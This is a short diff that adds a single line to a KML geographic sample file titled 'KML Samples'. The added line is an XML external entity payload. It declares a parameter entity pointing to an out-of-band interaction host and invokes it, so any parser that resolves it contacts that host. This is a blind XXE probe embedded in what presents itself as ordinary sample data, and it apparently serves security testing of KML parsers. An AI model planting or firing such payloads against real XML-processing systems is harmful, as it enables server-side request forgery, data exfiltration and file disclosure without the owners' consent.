@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://jxktyfdxe5vnb3txxfiq930mxd34ryfn.oastify.com"> %xxe; ]>
 <kml xmlns="http://www.opengis.net/kml/2.2">
     <Document>
         <name>KML Samples</name>
